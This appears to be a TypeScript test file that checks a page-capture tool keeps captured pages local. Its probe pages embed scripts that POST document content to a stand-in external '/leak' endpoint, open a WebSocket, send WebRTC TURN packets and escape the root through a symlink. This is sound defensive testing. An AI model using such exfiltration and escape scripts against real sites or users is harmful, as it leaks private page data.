import assert from 'node:assert/strict';
import { createSocket } from 'node:dgram';
import { mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { resolve } from 'node:path';
import { capture, type SourceOptions } from '../src/node/source.ts';

export async function validateNetwork() {
  const ice = createSocket('udp4');
  let icePackets = 0;
  ice.on('message', () => {
    icePackets++;
  });
  await new Promise<void>((done) => ice.bind(0, '127.0.0.1', done));
  const icePort = ice.address().port;
  let outsideRequests = 0;
  let writes = 0;
  let reads = 0;
  const outside = createServer((_req, res) => {
    outsideRequests++;
    res.end('unexpected external request');
  });
  await new Promise<void>((done) => outside.listen(0, '127.0.0.1', done));
  const outsideUrl = `http://127.0.0.1:${(outside.address() as AddressInfo).port}`;
  const server = createServer((req, res) => {
    if (req.url === '/rtc') {
      const probe = `let exposed=false;function attempt(w){for(const key of ['RTCPeerConnection','webkitRTCPeerConnection']){const C=w[key];if(C){exposed=true;try{const p=new C({iceServers:[{urls:'turn:127.0.0.1:${icePort}?transport=udp',username:'synthetic-document-secret',credential:'test'}]});p.createDataChannel('probe');p.createOffer().then(o=>p.setLocalDescription(o)).catch(()=>{});}catch{}}}}attempt(window);const f=document.createElement('iframe');f.srcdoc='<p>Frame</p>';f.onload=()=>{attempt(f.contentWindow);try{Object.defineProperty(window,'RTCPeerConnection',{value:function(){}});exposed=true}catch{}setTimeout(()=>{document.querySelector('#data').textContent=exposed?'RTC exposed':'RTC disabled in every frame';window.READY=true},1200)};document.body.append(f);attempt(f.contentWindow);`;
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(
        `<!doctype html><h1>Probe</h1><section id="required"><h2>Required</h2><p id="data">Waiting</p></section><script>${probe}</script>`,
      );
      return;
    }
    if (req.url === '/redirect') {
      res.writeHead(302, { Location: `${outsideUrl}/redirect-target` });
      res.end();
      return;
    }
    if (req.url === '/write') {
      writes++;
      res.end('should never run');
      return;
    }
    if (req.url === '/read') {
      reads++;
      res.end('Local data ready');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><h1>Local probe</h1><section id="required"><h2>Required content</h2><p id="data">Initial</p></section>
      <img src="${outsideUrl}/image"><img src="/redirect">
      <script>Promise.allSettled([fetch('${outsideUrl}/leak',{method:'POST',body:'document content'}),fetch('/write',{method:'POST',body:'change'}),fetch('/read').then(r=>r.text()).then(t=>document.querySelector('#data').textContent=t)]).then(()=>window.READY=true);new WebSocket('${outsideUrl.replace('http:', 'ws:')}/socket');</script>`);
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  const options: SourceOptions = {
    source: `http://127.0.0.1:${(server.address() as AddressInfo).port}/probe`,
    selectors: ['#required'],
    exclusions: [],
    ready: { mode: 'signal', value: 'READY', timeout: 5000 },
  };
  try {
    const rtc = await capture({ ...options, source: options.source.replace('/probe', '/rtc') });
    assert(rtc.sections[0].expectations.some((e) => e.text === 'RTC disabled in every frame'));
    assert.equal(icePackets, 0, 'WebRTC must not send ICE/TURN packets outside HTTP routing');
    const m = await capture(options);
    assert(m.sections[0].expectations.some((e) => e.text === 'Local data ready'));
    assert.equal(
      outsideRequests,
      0,
      'external requests, redirects and WebSockets must never reach another origin',
    );
    assert.equal(writes, 0, 'capture must not make write requests');
    assert.equal(reads, 1);
    // A local script and stylesheet are allowed, but a symlink escaping the HTML
    // directory is not. All probe files are disposable and project-local.
    const root = resolve('artifacts/network');
    await mkdir(`${root}/source`, { recursive: true });
    await writeFile(
      `${root}/outside.js`,
      "document.querySelector('#data').textContent='ESCAPED ROOT';",
    );
    await writeFile(
      `${root}/source/local.js`,
      "document.querySelector('#data').textContent='Local script ready';window.READY=true;",
    );
    await writeFile(`${root}/source/local.css`, 'body{font-family:Arial}');
    await rm(`${root}/source/escape.js`, { force: true });
    await symlink('../outside.js', `${root}/source/escape.js`);
    await writeFile(
      `${root}/source/probe.html`,
      '<!doctype html><link rel="stylesheet" href="local.css"><h1>Probe</h1><section id="required"><h2>Required content</h2><p id="data">Initial</p></section><script src="local.js"></script><script src="escape.js"></script>',
    );
    const local = await capture({ ...options, source: `${root}/source/probe.html` });
    assert(local.sections[0].expectations.some((e) => e.text === 'Local script ready'));
    assert(!JSON.stringify(local).includes('ESCAPED ROOT'));
    await writeFile(
      `${root}/source/tables.html`,
      '<!doctype html><h1>Shared heading</h1><table id="one"><tr><td>Approval</td></tr></table><table id="two"><tr><td>Approval</td></tr></table>',
    );
    await assert.rejects(
      capture({
        ...options,
        source: `${root}/source/tables.html`,
        selectors: ['#one', '#two'],
        ready: { mode: 'dom', value: '', timeout: 5000 },
      }),
      /shares a heading/,
    );
    console.log(
      'Locality: cross-origin requests/redirects, write requests, WebSockets, WebRTC and escaping file symlinks blocked; local scripts/styles and read-only data work.',
    );
  } finally {
    ice.close();
    await Promise.all([
      new Promise<void>((done) => server.close(() => done())),
      new Promise<void>((done) => outside.close(() => done())),
    ]);
  }
}
